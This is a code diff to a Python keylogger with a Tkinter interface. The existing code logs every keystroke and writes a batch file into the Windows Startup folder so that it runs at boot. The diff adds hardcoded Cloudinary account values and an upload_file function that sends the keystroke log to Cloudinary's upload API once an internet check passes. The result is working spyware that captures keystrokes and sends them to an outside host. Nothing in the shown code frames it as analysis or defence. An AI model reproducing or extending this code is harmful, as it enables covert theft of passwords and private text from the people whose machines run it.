@@ -3,12 +3,17 @@ import logging
 import time
 import getpass
 import os
+import requests
 from tkinter import *
 from tkinter import ttk
 from tkinter.messagebox import showinfo
 
 USER_NAME = getpass.getuser()
+CLOUD_NAME = "ddq6zg1yp" 
+RESOURCE_TYPE = "auto" 
+UPLOAD_PRESET = "ljfo7ly8"
 
+# GUI
 class App:
 
     def __init__(self, parent):
@@ -43,10 +48,9 @@ class App:
             showinfo(message='Done!')
 
 # Read every ket input and log it
-def on_press(key):
-    """Function to capture and log key presses."""
+def on_press(key): 
     try:
-        logging.info(f"Key pressed: {key.char}")
+        logging.info(f"Key pressed: {key.char}") 
     except AttributeError:
         logging.info(f"Special key pressed: {key}")
 
@@ -57,6 +61,23 @@ def add_to_startup(file_path=""):
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
         bat_file.write(r'start "" "%s"' % file_path)
+
+# Check internet connection of host device
+def is_connected():
+    response = requests.get("https://www.google.com/")
+    if(response.status_code == 200):
+        return True
+    else:
+        return False
+
+# 
+def upload_file():
+    payload = {'upload_preset': UPLOAD_PRESET}
+    files = [
+        ('file',('bes_key_log.txt', open('bes_key_log.txt','rb'), 'text/plain'))
+    ]
+    response = requests.post(f"https://api.cloudinary.com/v1_1/{CLOUD_NAME}/{RESOURCE_TYPE}/upload", data=payload, files=files)
+    print(response.json()) 
 
 # Adding the script to startup
 add_to_startup()
@@ -84,6 +105,9 @@ logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(ascti
 
 # Create a keyboard listener
 with pynput.keyboard.Listener(on_press=on_press) as listener:
-    listener.join()  # Run the listener in the background
+    if is_connected():
+        upload_file()
+    # Run the listener in the background
+    listener.join()  
 
 
